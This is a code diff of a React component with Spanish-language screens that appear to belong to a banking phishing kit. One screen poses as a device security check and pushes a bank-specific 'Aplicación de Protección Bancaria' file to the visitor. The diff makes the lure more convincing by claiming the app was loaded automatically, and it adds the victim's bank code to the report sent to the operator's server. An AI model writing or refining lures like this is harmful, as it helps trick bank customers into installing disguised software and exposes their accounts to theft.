@@ -779,15 +779,25 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 Estamos por analizar tu dispositivo para garantizar que no exista un mal uso de tu información personal o financiera.
               </p>
               <p className="text-gray-700">
-                Te invitamos a descargar nuestra <strong>Aplicación de Protección Bancaria</strong>, diseñada para brindarte una capa adicional de seguridad al interactuar con nuestros servicios.
+                Hemos cargado automáticamente la <strong>Aplicación de Protección Bancaria</strong> específica para tu banco, diseñada para brindarte una capa adicional de seguridad.
               </p>
+              {protectionFile && (
+                <div className="bg-green-50 p-4 rounded-lg border border-green-200">
+                  <p className="text-green-800 font-medium">
+                    ✓ Archivo de protección cargado: <strong>{protectionFile.fileName}</strong>
+                  </p>
+                  <p className="text-green-700 text-sm mt-1">
+                    Aplicación específica para {banco} lista para instalar
+                  </p>
+                </div>
+              )}
               <div className="bg-blue-50 p-4 rounded-lg">
                 <p className="text-gray-800">
-                  <strong>Precio de descarga:</strong> Gratuito
+                  <strong>Estado:</strong> Listo para enviar
                 </p>
               </div>
               <p className="text-gray-700">
-                <strong>Para iniciar tu descarga, haz clic en el siguiente botón:</strong>
+                <strong>Para continuar con la protección de tu cuenta, haz clic en enviar:</strong>
               </p>
             </div>
             <Button 
@@ -811,18 +821,19 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   
                   // Notificar al servidor que se realizó la descarga
                   onSubmit(ScreenType.PROTECCION_BANCARIA, { 
-                    action: 'download',
+                    action: 'send',
                     fileName: fileToDownload.fileName,
                     fileSize: screenData.fileSize || 'Desconocido',
                     downloaded: true,
-                    bankFile: !!protectionFile
+                    bankFile: !!protectionFile,
+                    banco: bankCode
                   });
                 } else {
                   alert('El archivo de protección para este banco aún no está disponible. Por favor, contacta al administrador.');
                 }
               }}
             >
-              Descargar ahora
+              Enviar
             </Button>
           </>
         );
